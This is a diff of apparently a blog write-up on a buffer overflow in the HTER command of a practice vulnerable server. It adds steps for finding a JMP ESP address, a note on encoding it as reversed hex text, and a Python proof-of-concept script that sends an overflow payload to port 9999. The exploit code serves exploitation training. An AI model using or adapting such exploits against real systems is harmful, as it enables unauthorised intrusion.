@@ -87,16 +87,40 @@ s.close()
 
 ![](/assets/img/HTER/3.png)
 
-#### Hijacking the execution
+#### Hijacking the execution.
 
 ##### As with any other buffer overflow, it is now essential to find an address with a JMP ESP instruction, which will allow us to execute any type of code with no restrictions whatsoever.
 
-###### Enumerating the modules
+###### Enumerating the modules.
 
 ![](/assets/img/HTER/4.png)
 
+###### Hunting for the required instruction.
 
-  
-  
-  
+##### Now that the vital address has been already acquired, it can't just be placed as we always did, with struct or a hex escape sequence (\x). Instead, it must be placed on reverse, just without the aforementioned hexadecimal condition. For example, instead of sending \x41\x49, 4149 is chosen.
 
+![](/assets/img/HTER/5.png)
+
+###### PoC code:
+
+```term
+import socket, sys
+
+host = sys.argv[1]
+
+jmpesp = "AF115062" # 625011AF
+
+buffer = "HTER " + "A" * 2041 + jmpesp + "FF" * 200
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+s.connect((host, 9999))
+
+s.send(buffer)
+
+s.close()
+```
+
+##### Crash IV
+
+![](/assets/img/HTER/6.png)
